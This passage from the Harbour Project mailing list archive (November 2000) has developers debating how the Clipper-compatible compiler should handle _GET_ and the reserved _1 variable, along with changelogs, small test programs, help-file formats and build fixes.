Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ryszard,

&gt;<i> &gt; I see one clear disadvantage in that it is far less obvious
</I>&gt;<i> that way. One
</I>&gt;<i> &gt; would have far more difficult time finding this kind of mangling.
</I>&gt;<i>
</I>&gt;<i>   It handles mangling in more efficient method - no additional
</I>&gt;<i> complicated bison rules, no static variables. You will see more
</I>&gt;<i> advantages when I will finish support for macro variables and object
</I>&gt;<i> variables.
</I>
1. Strange, I see the exact opposite very complex logic in expression
optimizer vs. very simple yacc rules.
2. After your changes GET is seriously broken, as you just found out.

&gt;<i>   It makes the mangling avaliable for macro compiler - yes, Clipper
</I>&gt;<i> doesn't support it which in my opinion is a disadvantage. However it is
</I>&gt;<i> easier to include/exclude such support placed in expression optimizer
</I>&gt;<i> than placing it in bison rules. Handling _GET_ in macro compiler in the
</I>&gt;<i> same way as in the harbour compiler will make easier GET usage in
</I>&gt;<i> scripting because it will be not required to distinguish editing of
</I>&gt;<i> plain variables from arrays.
</I>
Whether it is a disadvantage or not, is irrelevant. This is a characteristic
of Clipper which probably affect numerous programs. There will likely be
lots of code that will break if this logic is changed!

&gt;<i> &gt; Was there any bug you can point to?
</I>&gt;<i>
</I>&gt;<i>   There was bug in harbour.l, there was bug in pptable.c (using a local
</I>&gt;<i> _1 variable - BTW, why simplex user cannot edit '_1' variable?) -
</I>&gt;<i> removing a codeblock from pptable.c caused that all rules in harbour.y
</I>&gt;<i> required rewriting from the beginning. Support for macro expressions
</I>&gt;<i> (&amp;var) become invalid, support for object variables become invalid.
</I>
1. Which bug in harbour.l?
2. _1 is not a bug! Clipper itself imposes same limitation - please check
MENU TO implementation in STD.CH.
3. There was no need to remove codeblock from pptable. If you'll check
you'll find that Clipper _does_ pass a block as parameter to __GET. The
block is _not_ created *inside* __GET().
4. Support for &amp;Var and and object variables is only broken after your hasty
change, it is working correctly in SimpLex version after excluding your
changes.

Ron


</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 18:32:01 2000
Date: Tue Nov  7 18:32:01 2000
From: Luiz Rafael Culik Guimaraes harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ron,Ryszard

Here is my opinion

IN {|_1| ...}
Clipper use the _1 in codecode block  for many prepressed functions. I agree
with Ron to use the {|_1|...} styles code blocks

Regards

Luiz Rafael Culik


</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 18:48:01 2000
Date: Tue Nov  7 18:48:01 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ron,

&gt;<i> 1. Strange, I see the exact opposite very complex logic in expression
</I>&gt;<i> optimizer vs. very simple yacc rules.
</I>
IMHO it's not about complexity, it's about the proper place for implementation.

&gt;<i> Whether it is a disadvantage or not, is irrelevant. This is a characteristic
</I>&gt;<i> of Clipper which probably affect numerous programs. There will likely be
</I>&gt;<i> lots of code that will break if this logic is changed!
</I>
&gt;<i> 2. _1 is not a bug! Clipper itself imposes same limitation - please check
</I>&gt;<i> MENU TO implementation in STD.CH.
</I>
Why do you think that having __GET() support is more dangerous than 
introducing _1 as a reserved var for GETs ?

The fact that MENU TO uses _1 don't have any relations to the fact that 
(if I understand the problem correctly) @ 10, 10 GET _1 won't work 
in Harbour, but will in CA-Clipper.

Moreover _1 _is_ namespace pollution, while the GET in macros just looks 
like a feature extension, as such it looks less dangerous to me.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 19:09:02 2000
Date: Tue Nov  7 19:09:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Victor,

&gt;<i> Why do you think that having __GET() support is more dangerous than
</I>&gt;<i> introducing _1 as a reserved var for GETs ?
</I>&gt;<i>
</I>&gt;<i> The fact that MENU TO uses _1 don't have any relations to the fact that
</I>&gt;<i> (if I understand the problem correctly) @ 10, 10 GET _1 won't work
</I>&gt;<i> in Harbour, but will in CA-Clipper.
</I>&gt;<i>
</I>&gt;<i> Moreover _1 _is_ namespace pollution, while the GET in macros just looks
</I>&gt;<i> like a feature extension, as such it looks less dangerous to me.
</I>&gt;<i>
</I>&gt;<i> Victor Szakats
</I>
Did you test it?

My tests shows that you can't use _1 with Clipper as the name of a GET which
is a clear proof that this is exactly how Clipper handle it too!!!

Try this prg:

// -------------- test.prg ---------------- //
PROCEDURE Main

   LOCAL GetList := {}, _1 := &quot;Hello&quot; _2 := &quot;World

   CLS

   @ 10,10 GET _1
   @ 12,10 GET _2

   READ

   ? _1
   ? _2

RETURN
// -------------- EOF test.prg ---------------- //

Can you please report and explain your findings...

Ron


</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 19:24:02 2000
Date: Tue Nov  7 19:24:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ron,

&gt;<i> PROCEDURE Main
</I>&gt;<i> // -------------- EOF test.prg ---------------- //
</I>&gt;<i> 
</I>&gt;<i> Can you please report and explain your findings...
</I>
Checked it (although not with the above one), and it looks like 
CA-Clipper will ignore those gets with _1. Strange but true.

Even more odd that this _will_ work in CA-Clipper:
------------------------------
LOCAL _1[1]

_1[1] := &quot;HELLO    &quot;

@ 10,10 GET _1[1]
READ
------------------------------

How Harbour handle this ?

I wonder where this behaviour is documented. Questions 
are: Should we consider this as a CA-Clipper bug ? 
Can we, should we fix it in Harbour ?

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 20:49:02 2000
Date: Tue Nov  7 20:49:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Victor,

Clipper/Harbour does _not_ ignore the _1. This is a simple side effect to
using the bSetGet block {|_1| IIF( PCount()== 0,&lt;V&gt;,&lt;V&gt;:=_1}. You see, when
the Var is _1  the block becomes: {|_1| IIF( PCount()== 0,_1,_1:=_1}

Now when the GET is being created oGet:Buffer will be assigned Eval( {|_1|
IIF( PCount()== 0,_1,_1:=_1} ). Since _1 is a local of the _block_ which was
never initialized it equals NIL. Thus the ReadModal() will skip the NIL
valued oGet. It is the Equivalent of:

------------------------------
LOCAL MyVar := NIL

@ 10,10 GET  MyVar // MyVar will be skipped (ignored) by READ
READ
------------------------------

Harbour (SimpLex) handles it the exact same way, with the exact same side
effect.

As to _1[1] It is not subject to the same side effect because _GET_(...)  of
Array Element is being translated to __GETA() which creates and uses a
different kind of block.

Harbour (SimpLex) again works the exact same way.

This is not a bug, it is a characteristic of the implementation. There are
many similar side effects in the Clipper implementation.

Ron

&gt;<i> Ron,
</I>&gt;<i>
</I>&gt;<i> &gt; PROCEDURE Main
</I>&gt;<i> &gt; // -------------- EOF test.prg ---------------- //
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; Can you please report and explain your findings...
</I>&gt;<i>
</I>&gt;<i> Checked it (although not with the above one), and it looks like
</I>&gt;<i> CA-Clipper will ignore those gets with _1. Strange but true.
</I>&gt;<i>
</I>&gt;<i> Even more odd that this _will_ work in CA-Clipper:
</I>&gt;<i> ------------------------------
</I>&gt;<i> LOCAL _1[1]
</I>&gt;<i>
</I>&gt;<i> _1[1] := &quot;HELLO    &quot;
</I>&gt;<i>
</I>&gt;<i> @ 10,10 GET _1[1]
</I>&gt;<i> READ
</I>&gt;<i> ------------------------------
</I>&gt;<i>
</I>&gt;<i> How Harbour handle this ?
</I>&gt;<i>
</I>&gt;<i> I wonder where this behaviour is documented. Questions
</I>&gt;<i> are: Should we consider this as a CA-Clipper bug ?
</I>&gt;<i> Can we, should we fix it in Harbour ?
</I>&gt;<i>
</I>&gt;<i> Victor Szakats
</I>

</PRE>

From harbour@lists.harbour-project.org  Tue Nov  7 23:43:02 2000
Date: Tue Nov  7 23:43:02 2000
From: Phil Barnett harbour@lists.harbour-project.org
Subject: [Harbour] Help Types.

<PRE>Can someone give me an exhaustive list of all the flavors we can 
output Harbour Project help files in?

And, how many languages have the help files been translated to?

Thanks.


-- 
              Phil Barnett  mailto:<A HREF="mailto:midnight@the-oasis.net">midnight@the-oasis.net</A>
                       WWW  <A HREF="http://www.the-oasis.net/">http://www.the-oasis.net/</A>
                  FTP Site  <A HREF="ftp://ftp.the-oasis.net">ftp://ftp.the-oasis.net</A>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 02:04:02 2000
Date: Wed Nov  8 02:04:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>2000-11-07 22:50 UTC+0800 Ron Pinkas &lt;<A HREF="mailto:ron@profit-master.com">ron@profit-master.com</A>&gt;
   * include/hberrors.h
     + Added: #define HB_COMP_ERR_BLOCK                       47
   * source/compiler/hbgenerr.c
     + Added Error: &quot;Code block contains both macro and declared symbol
references&quot;

   * source/compiler/harbour.c
     * Made public: hb_compLocalGetPos() and hb_compStaticGetPos()

   * source/compiler/harbour.slx
     + Added: char * hb_comp_SLX_LastBlock( BOOL bReset )

   * source/compiler/harbour.sly
     + Added logic to support Early Expansions of Macro within CodeBlock
unless parenthesized.

   + tests/tstblock.prg
     + New test of Early/Late expansion of Macros within CodeBlocks.


</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 02:26:01 2000
Date: Wed Nov  8 02:26:01 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] Re: bug in GET

<PRE>Chen,

Fixed!

Ron

&gt;<i> Chen,
</I>&gt;<i> 
</I>&gt;<i> Thanks for the info. The Macro bug is actually _not_ a GET bug 
</I>&gt;<i> but rather a
</I>&gt;<i> code block bug.
</I>&gt;<i> 
</I>&gt;<i> In clipper Macros within CodeBlock are EARLY expanded unless 
</I>&gt;<i> parenthesized.
</I>&gt;<i> 
</I>&gt;<i> Note the following:
</I>&gt;<i> 
</I>&gt;<i> //------------------------------ //
</I>&gt;<i> PROCEDURE Main
</I>&gt;<i> 
</I>&gt;<i>    LOCAL bBlock := Array(3)
</I>&gt;<i>    PUBLIC i, macro
</I>&gt;<i>    PUBLIC var1, var2, var3
</I>&gt;<i> 
</I>&gt;<i>    var1 := &quot;Var1&quot;
</I>&gt;<i>    var2 := &quot;Var2&quot;
</I>&gt;<i>    var3 := &quot;Var3&quot;
</I>&gt;<i> 
</I>&gt;<i>    CLS
</I>&gt;<i> 
</I>&gt;<i>    FOR i = 1 TO 3
</I>&gt;<i>       macro := &quot;var&quot; + str( i, 1 )
</I>&gt;<i>       bBlock[i] := {|| &amp;Macro }
</I>&gt;<i>    NEXT
</I>&gt;<i> 
</I>&gt;<i>    FOR i = 1 TO 3
</I>&gt;<i>       ? Eval( bBlock[i] )
</I>&gt;<i>    NEXT
</I>&gt;<i> 
</I>&gt;<i>    FOR i = 1 TO 3
</I>&gt;<i>       macro := &quot;var&quot; + str( i, 1 )
</I>&gt;<i>       bBlock[i] := {|| &amp;(Macro) }
</I>&gt;<i>    NEXT
</I>&gt;<i> 
</I>&gt;<i>    FOR i = 1 TO 3
</I>&gt;<i>       ? Eval( bBlock[i] )
</I>&gt;<i>    NEXT
</I>&gt;<i> 
</I>&gt;<i> RETURN
</I>&gt;<i> //------------------------------ //
</I>&gt;<i> 
</I>&gt;<i> Ron
</I>&gt;<i> 
</I>&gt;<i> &gt; 2. using array as get variable DO work (both lexer),
</I>&gt;<i> &gt;    using macro as get variable does NOT work (both lexer).
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; ------------- Get var is MACRO ------------
</I>&gt;<i> &gt; PROCEDURE main
</I>&gt;<i> &gt; PUBLIC i, macro
</I>&gt;<i> &gt; PUBLIC var1, var2, var3
</I>&gt;<i> &gt; var1 := var2 := var3 := space( 5 )
</I>&gt;<i> &gt; CLS
</I>&gt;<i> &gt; FOR i = 1 TO 3
</I>&gt;<i> &gt;   macro := &quot;var&quot; + str( i, 1 )
</I>&gt;<i> &gt;   @ 10+i, 10 SAY str( i ,1 ) + &quot;:&quot; GET &amp;macro
</I>&gt;<i> &gt; NEXT
</I>&gt;<i> &gt; READ
</I>&gt;<i> &gt; FOR i = 1 to 3
</I>&gt;<i> &gt;   macro := &quot;var&quot; + str( i, 1 )
</I>&gt;<i> &gt;   ? i, &amp;macro
</I>&gt;<i> &gt; NEXT
</I>&gt;<i> &gt; RETURN
</I>&gt;<i> &gt; -------------------------------------------
</I>&gt;<i> &gt;
</I>&gt;<i> &gt; all samples work when complied with Clipper 5.2e
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;
</I>&gt;<i> &gt;   Chen.
</I>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 02:35:03 2000
Date: Wed Nov  8 02:35:03 2000
From: Chen Kedem harbour@lists.harbour-project.org
Subject: [Harbour] Re: Help Types.

<PRE>Phil,

&gt;<i> how many languages have the help files been translated to?
</I>
if you look under doc/ you can see that at the moment English
(about 50% of the function are documented) and Spanish (which
is only 1/4 of the English version), it was stated on the list
that some one is working on the Korian version.

&gt;<i> exhaustive list of all the flavors we can output
</I>&gt;<i> Harbour Project help files in?
</I>
if I look at Luiz great work at utils/hbdoc I can find:

TXT - plain ASCII text format
    - plain ASCII text format without Form-Feed
RTF - Rich text format
NGI - Norton Guide source
IPF - OS/2 help source code
PDF - Adobe Portable Document
HTM - HTML output
CHM - HTML source files for Windows .CHM Help files
HPC - HelpC source file
TRF - Linux TROFF code


  Chen.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 04:42:02 2000
Date: Wed Nov  8 04:42:02 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Victor Szakats wrote:

&gt;<i> I wonder where this behaviour is documented. Questions
</I>&gt;<i> are: Should we consider this as a CA-Clipper bug ?
</I>&gt;<i> Can we, should we fix it in Harbour ?
</I>
  It seems that Clipper adds '_1' variable during _GET_ =&gt; __GET
translation.
I think that we can replace '_1' with HB_PVALUE(1) call. So:

{|_1| IIF( PCOUNT()==0, \1C00, \1C00:=_1)}

can be replaced with

{|| IIF( PCOUNT()==0, \1C00, \1C00:=HB_PVALUE(1))}

I have tested it and it works correctly. However we need to remove #if
HB_EXTENSION from rtl/pvalue.c

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 05:00:04 2000
Date: Wed Nov  8 05:00:04 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] casts for C++

<PRE>[To All]

The VC++ build needs:

1. a cast adding to line 791 of source\compiler\cmdcheck.c, so it's:
            sDefLine =3D (char *) hb_xgrab( strlen( szDefText ) + 1 + str=
len( pAssign + 1 ) + 1 );

2. the same cast adding to line 132 of utils\hbpp\hbpp.c:
                       sDefLine =3D (char *) hb_xgrab( strlen( szDefText =
) + 1 + strlen( pAssign + 1 ) + 1 );

John.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 05:01:02 2000
Date: Wed Nov  8 05:01:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] VC++ / SIMPLEX

<PRE>[To Paul]

Thanks - I'll send the files as soon as I get a clean build with this
ever-changing beast. :-)

John.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 05:01:12 2000
Date: Wed Nov  8 05:01:12 2000
From: Chen Kedem harbour@lists.harbour-project.org
Subject: [Harbour] long file names under contrib

<PRE>-----------------------------------------------------------------

Maurilio,

contrib/mysql/dbf2mysql.prg
contrib/mysql/mysql_com.h
contrib/mysql/mysql_version.h

I understand that both h files are part of the MySQL distribution
and therefor should hold this exact name, but the prg file should
match the project 8.3 file names.

-----------------------------------------------------------------

contrib/runjava/Harbour.java

is this a must to have this name/extension ?

-----------------------------------------------------------------

  Chen.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 05:28:01 2000
Date: Wed Nov  8 05:28:01 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>On Wed, Nov 08, 2000 at 01:24:22AM +0100, Victor Szakats wrote:

&gt;<i> [SNIP _1 considered harmful]
</I>&gt;<i>
</I>&gt;<i> I wonder where this behaviour is documented. 
</I>
Guide to CA-Clipper&gt;&gt;Tables&gt;&gt;Reserved Words.

&gt;<i>                                              Questions are: Should we
</I>&gt;<i> consider this as a CA-Clipper bug ? Can we, should we fix it in Harbour ?
</I>
It isn't a bug and it is documented. To quote from the above pointer:

,----[ CA-Clipper&gt;&gt;Tables&gt;&gt;Reserved Words ]
|<i>  o  All identifiers that begin with one or more underscore characters
</I>|<i>     (_) are designated as system identifiers and are therefore reserved.
</I>`----

Anyone ignoring this documented fact is getting what they deserve. ;&gt;

-- 
Take a look in Hagbard's World: |   w3ng - The WWW Norton Guide reader.
<A HREF="http://www.hagbard.demon.co.uk/">http://www.hagbard.demon.co.uk/</A> |     eg - Norton Guide reader for Linux.
<A HREF="http://www.acemake.com/hagbard/">http://www.acemake.com/hagbard/</A> |    weg - Norton Guide reader for Windows.
Free software, including........| dgscan - DGROUP scanner for Clipper.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 05:58:02 2000
Date: Wed Nov  8 05:58:02 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>[To Victor]

Ron's correct: quite a few things in Clipper use the idea that _1,
_2, etc are sort of reserved for things.  I think it's reasonable
that user's would be very unlikely to use those names.  However, I
don't think it's in the docs.  But if you read the CH files you soon
see it.

Various 3P's followed the same convention.  E.g. I do, but I'm not at
all the only one.  It's not caused problems with users' code. :-)

As to where _GET_ should be handled, doing it the Clipper way has some
obvious advantages, which is a vote for Ron.  Doing it in some sort
of expression optimiser sounds better in some ways, but one thing
that really worries me is that such optimisers normally cause so many
bugs and take so long to become stable that with a project in the
state Harbour is I really think it's far too early to add one!  In
fact, systems are so fast now that I have doubts as to whether such
things should be added at all.

Surely everyone here's had to disable various optimisers at various
times because they didn't work correctly!  I know I have, and tracking
problems back to optimisers is a job I hate.  I add enough bugs and
I don't need extra ones!!

John.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 07:26:03 2000
Date: Wed Nov  8 07:26:03 2000
From: Dave Pearson harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>On Wed, Nov 08, 2000 at 05:56:52AM -0500, John Skelton wrote:

&gt;<i> Ron's correct: quite a few things in Clipper use the idea that _1, _2, etc
</I>&gt;<i> are sort of reserved for things. I think it's reasonable that user's would
</I>&gt;<i> be very unlikely to use those names. However, I don't think it's in the
</I>&gt;<i> docs. But if you read the CH files you soon see it.
</I>
See my other email on this subject, it is clearly documented in the
CA-Clipper documentation that identifiers that start with an underscore are
to be treated as reserved words.

-- 
The Harbour Project: A free software Clipper compatible compiler
Home Page..........: <A HREF="http://www.harbour-project.org/">http://www.harbour-project.org/</A>
FAQ................: <A HREF="http://www.harbour-project.org/faq/harbour.html">http://www.harbour-project.org/faq/harbour.html</A>
My harbour page....: <A HREF="http://www.hagbard.demon.co.uk/harbour/">http://www.hagbard.demon.co.uk/harbour/</A>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 07:32:02 2000
Date: Wed Nov  8 07:32:02 2000
From: Maurilio Longo harbour@lists.harbour-project.org
Subject: [Harbour] long file names under contrib

<PRE>Chen,

it is in contrib and no DOS users will be able to use it :-)

regards.


Chen Kedem ha scritto:
&gt;<i> 
</I>&gt;<i> -----------------------------------------------------------------
</I>&gt;<i> 
</I>&gt;<i> Maurilio,
</I>&gt;<i> 
</I>&gt;<i> contrib/mysql/dbf2mysql.prg
</I>&gt;<i> contrib/mysql/mysql_com.h
</I>&gt;<i> contrib/mysql/mysql_version.h
</I>&gt;<i> 
</I>&gt;<i> I understand that both h files are part of the MySQL distribution
</I>&gt;<i> and therefor should hold this exact name, but the prg file should
</I>&gt;<i> match the project 8.3 file names.
</I>&gt;<i> 
</I>&gt;<i> -----------------------------------------------------------------
</I>&gt;<i> 
</I>&gt;<i> contrib/runjava/Harbour.java
</I>&gt;<i> 
</I>&gt;<i> is this a must to have this name/extension ?
</I>&gt;<i> 
</I>&gt;<i> -----------------------------------------------------------------
</I>&gt;<i> 
</I>&gt;<i>   Chen.
</I>&gt;<i> _______________________________________________
</I>&gt;<i> Harbour mailing list
</I>&gt;<i> <A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
</I>&gt;<i> <A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>
</I>&gt;<i> 
</I>&gt;<i> Thank you for participating in The Harbour Project.  Be sure to check
</I>&gt;<i> <A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>
</I>
-- 
 __________                   
|<i>  |  | |__| <A HREF="mailto:md2520@mclink.it">md2520@mclink.it</A> 
</I>|<i>_|_|_|____| Team OS/2 Italia
</I>
</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 07:52:01 2000
Date: Wed Nov  8 07:52:01 2000
From: Hadi Hermawan harbour@lists.harbour-project.org
Subject: [Harbour] Konvert little program

<PRE>I have little program in delphi

------

const ala = $304

var
  int : byte
  inst : byte

procedure ins( addrs : word )
begin
     asm 
            mov dx, addrs
            in al, dx 
            mov int, al
      end;
end;

procedure outs( addr : word; dt : byte )
begin
     asm
            mov dx, addr
            mov al, dt
            out  dx, al
     end;
end;

procedure Gets ()
begin
     outs( ala, $81);
     outs( ala, $89);
     outs( ala, $81);
     ins( ala + 1 );
     int := int and $1
     if int &lt;&gt; 0 Then ints := 1 else ints := 0
end;


how to convert to clipper or harbour 


</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 08:13:02 2000
Date: Wed Nov  8 08:13:02 2000
From: =?iso-8859-1?Q?Ignacio_Ortiz_de_Zu=F1iga?= harbour@lists.harbour-project.org
Subject: [Harbour] Konvert little program

<PRE>&gt;&gt;<i>begin
</I>&gt;&gt;<i>     asm
</I>&gt;&gt;<i>end;
</I>
It will be great if we can have BEGIN C CODE, END C CODE statements so we
can create C &amp; assembler functions on the fly.

Regards,


Ignacio Ortiz
Email: <A HREF="mailto:ignacio@ozs.com">ignacio@ozs.com</A>
http: www.ozs.com

-----Mensaje original-----
De: <A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>
[mailto:<A HREF="mailto:harbour-admin@lists.harbour-project.org">harbour-admin@lists.harbour-project.org</A>]En nombre de Hadi
Hermawan
Enviado el: miércoles, 08 de noviembre de 2000 13:50
Para: <A HREF="mailto:harbour@lists.harbour-project.org">harbour@lists.harbour-project.org</A>
Asunto: [Harbour] Konvert little program


I have little program in delphi

------

const ala = $304

var
  int : byte
  inst : byte

procedure ins( addrs : word )
begin
     asm
            mov dx, addrs
            in al, dx
            mov int, al
      end;
end;

procedure outs( addr : word; dt : byte )
begin
     asm
            mov dx, addr
            mov al, dt
            out  dx, al
     end;
end;

procedure Gets ()
begin
     outs( ala, $81);
     outs( ala, $89);
     outs( ala, $81);
     ins( ala + 1 );
     int := int and $1
     if int &lt;&gt; 0 Then ints := 1 else ints := 0
end;


how to convert to clipper or harbour

_______________________________________________
Harbour mailing list
<A HREF="mailto:Harbour@lists.harbour-project.org">Harbour@lists.harbour-project.org</A>
<A HREF="http://www.matrixlist.com/mailman/listinfo/harbour">http://www.matrixlist.com/mailman/listinfo/harbour</A>

Thank you for participating in The Harbour Project.  Be sure to check
<A HREF="http://www.Harbour-Project.org">http://www.Harbour-Project.org</A>



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 09:55:03 2000
Date: Wed Nov  8 09:55:03 2000
From: rglab harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-08 15:40 UTC+0100

<PRE>    *include/hbapi.h
    *include/hbapiitm.h
    *source/vm/arrays.c
    *source/vm/codebloc.c
    *source/vm/garbage.c
    *source/vm/itemapi.c
    *source/vm/memvars.c
        * fixed the order of memory deallocations done in the garbage
          collector (this will fix many random core dumps/GPF's)
        * removed unnecessary reference counter inc/dec operations       

Regards, Ryszard

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 09:58:02 2000
Date: Wed Nov  8 09:58:02 2000
From: Ron Pinkas harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>John,

Just a small clarification.

Harbour _already_ has an Expression Optimizer. Ryszard developed it, and it
is IMO an *awesome* piece of code.

Regardless of the reservation I have, regarding where to place a hack such
as _GET_ (which I don't consider an optimization). I would like it noted
that I am very thankful to Ryszard for contributing this impressive
subsystem.

Ron

&gt;<i> As to where _GET_ should be handled, doing it the Clipper way has some
</I>&gt;<i> obvious advantages, which is a vote for Ron.  Doing it in some sort
</I>&gt;<i> of expression optimiser sounds better in some ways, but one thing
</I>&gt;<i> that really worries me is that such optimisers normally cause so many
</I>&gt;<i> bugs and take so long to become stable that with a project in the
</I>&gt;<i> state Harbour is I really think it's far too early to add one!  In
</I>&gt;<i> fact, systems are so fast now that I have doubts as to whether such
</I>&gt;<i> things should be added at all.
</I>&gt;<i>
</I>&gt;<i> Surely everyone here's had to disable various optimisers at various
</I>&gt;<i> times because they didn't work correctly!  I know I have, and tracking
</I>&gt;<i> problems back to optimisers is a job I hate.  I add enough bugs and
</I>&gt;<i> I don't need extra ones!!
</I>&gt;<i>
</I>&gt;<i> John.
</I>

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 11:20:04 2000
Date: Wed Nov  8 11:20:04 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Ryszard,


&gt;<i> I have tested it and it works correctly. However we need to remove #if
</I>&gt;<i> HB_EXTENSION from rtl/pvalue.c
</I>
Or we could add an internal version of the same function, like:
__PVALUE(), which could be there all the time.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 11:27:01 2000
Date: Wed Nov  8 11:27:01 2000
From: John Skelton harbour@lists.harbour-project.org
Subject: [Harbour] Konvert little program

<PRE>[To Hadi Hermawan]

&quot;I have little program in delphi&quot;

You're right: the delphi program _is_ small.

The asm is also small.  I have to say I don't personally regard the
asm as being delphi, even though it is embedded in a delphi program.

IAC, surely the right thing to do with Harbour is to use a small
amount of C (or asm) code for the very low level things, and call
them from the Harbour code.  Easy to do.  Adding in-line C/asm support
to Harbour is not quite so easy (especially asm), not least because
portability (lack of) is likely to be a thorny issue.  Also, if
Harbour can generate OBJ or java or Pascal/Delphi or &lt;etc&gt; then to
handle embedded asm/C it would need something pretty scary.

The above is on the basis that the low level access makes sense.
Your code only makes sense under a rather restricted situation
(mainly DOS, I think, and _not_ a Windows DOS box).  Linux, Windows,
and many other OSes, won't like the things you're attempting.  And
a MIPS or ARM or &lt;etc&gt; CPU won't like Intel x86 instructions...

John.

</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 11:28:02 2000
Date: Wed Nov  8 11:28:02 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] ChangeLog 2000-11-04 13:35 UTC+0100

<PRE>Dave,


&gt;<i> &gt; I wonder where this behaviour is documented. 
</I>&gt;<i> 
</I>&gt;<i> Guide to CA-Clipper&gt;&gt;Tables&gt;&gt;Reserved Words.
</I>&gt;<i>
</I>&gt;<i> It isn't a bug and it is documented. To quote from the above pointer:
</I>&gt;<i> 
</I>&gt;<i> ,----[ CA-Clipper&gt;&gt;Tables&gt;&gt;Reserved Words ]
</I>&gt;<i> |  o  All identifiers that begin with one or more underscore characters
</I>&gt;<i> |     (_) are designated as system identifiers and are therefore reserved.
</I>&gt;<i> `----
</I>
I meant a rule specifically for the GETs, I know about the general 
rule not to use symbols beginning with &quot;_&quot;.

Still if CA-Clipper would not break for _1 specifically with GETs, 
Harbour should not do so either, regardless of this general 
underscore rule. Enough said, CA-Clipper GET doesn't like _1 
either, so there's no problem.

&gt;<i> Anyone ignoring this documented fact is getting what they deserve. ;&gt;
</I>
Agreed, although I've seen (and probably many of us have seen) application 
code which used underscored variables, shame on them.

Considering all this, if we can implement the same thing without this 
limitation, that could not hurt anyone.

Victor Szakats



</PRE>

From harbour@lists.harbour-project.org  Wed Nov  8 11:35:04 2000
Date: Wed Nov  8 11:35:04 2000
From: Victor Szakats harbour@lists.harbour-project.org
Subject: [Harbour] _GET_, _1 and optimisers

<PRE>John,


&gt;<i> Ron's correct: quite a few things in Clipper use the idea that _1,
</I>&gt;<i> _2, etc are sort of reserved for things.  I think it's reasonable
</I>&gt;<i> that user's would be very unlikely to use those names.  However, I
</I>&gt;<i> don't think it's in the docs.  But if you read the CH files you soon
</I>&gt;<i> see it.
</I>
Yes, I knew about the underscore rule, I was just unaware that 
GET is also involved.

&gt;<i> As to where _GET_ should be handled, doing it the Clipper way has some
</I>&gt;<i> obvious advantages, which is a vote for Ron.  Doing it in some sort
</I>&gt;<i> of expression optimiser sounds better in some ways, but one thing
</I>&gt;<i> that really worries me is that such optimisers normally cause so many
</I>&gt;<i> bugs and take so long to become stable that with a project in the
</I>&gt;<i> state Harbour is I really think it's far too early to add one!  In
</I>&gt;<i> fact, systems are so fast now that I have doubts as to whether such
</I>&gt;<i> things should be added at all.
</I>&gt;<i> 
</I>&gt;<i> Surely everyone here's had to disable various optimisers at various
</I>&gt;<i> times because they didn't work correctly!  I know I have, and tracking
</I>&gt;<i> problems back to optimisers is a job I hate.  I add enough bugs and
</I>&gt;<i> I don't need extra ones!!
</I>
Harbour's optimizer caused very few problems when it was added, and 
pratically none since the addition was finished. Note that we do need an 
